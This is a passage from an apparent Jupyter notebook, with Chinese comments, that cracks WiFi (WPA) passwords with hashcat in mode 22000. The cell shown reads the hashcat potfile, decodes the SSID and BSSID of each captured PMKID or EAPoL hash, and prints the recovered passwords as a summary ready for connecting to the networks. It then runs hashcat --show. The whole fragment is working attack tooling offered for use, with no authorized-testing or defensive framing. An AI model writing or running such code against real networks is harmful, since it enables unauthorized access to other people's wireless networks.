    print('  3. 如果密码包含特殊字符，需要扩展掩码范围')
elif n < TOTAL_APS:
    print(f'  部分破解: {n}/{TOTAL_APS} 个AP')
    print(f'  未破解的AP可能使用了更复杂的密码')
print(f'{"═"*60}')

## 5. 查看破解结果

In [ ]:
# ============================================================================
# 破解结果展示（按AP去重统计）
# ============================================================================
import os, subprocess

print('='*60)
print('  破解结果')
print('='*60)

cracked_aps = {}
if os.path.exists(POTFILE):
    with open(POTFILE) as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                hp, pw = line.rsplit(':', 1)
                parts = hp.split('*')
                ssid = bssid_raw = htype = ''
                if len(parts) >= 6:
                    htype = 'PMKID' if parts[1]=='01' else 'EAPoL'
                    bssid_raw = parts[3]
                    try: ssid = bytes.fromhex(parts[5]).decode('utf-8', errors='replace')
                    except: ssid = parts[5]
                    if bssid_raw not in cracked_aps:
                        bssid = ':'.join(bssid_raw[j:j+2] for j in range(0,12,2)) if len(bssid_raw)>=12 else bssid_raw
                        cracked_aps[bssid_raw] = {'ssid':ssid,'password':pw,'bssid':bssid,'type':htype}

if cracked_aps:
    print(f'\n  成功破解 {len(cracked_aps)}/{TOTAL_APS} 个AP!\n')
    for i, (_, c) in enumerate(cracked_aps.items()):
        print(f'  {i+1}. {c["ssid"]}: {c["password"]}  ({c["bssid"]}) [{c["type"]}]')
    print(f'\n  密码汇总（可直接连接WiFi）:')
    print(f'  {"─"*40}')
    for _, c in cracked_aps.items():
        print(f'  SSID: {c["ssid"]}  密码: {c["password"]}')
else:
    print('\n  未破解任何密码')
    print('  建议: 检查握手包完整性，或尝试更大字典')

# hashcat --show 输出
print(f'\n{"="*60}')
print('  hashcat --show 详细输出:')
print(f'{"="*60}')
r = subprocess.run([HASHCAT_BIN,'-m','22000',ALL_HASHES,'--potfile-path',POTFILE,'--show'],
                   capture_output=True, text=True, timeout=30)
if r.stdout: print(r.stdout)
else: print('  无已破解记录')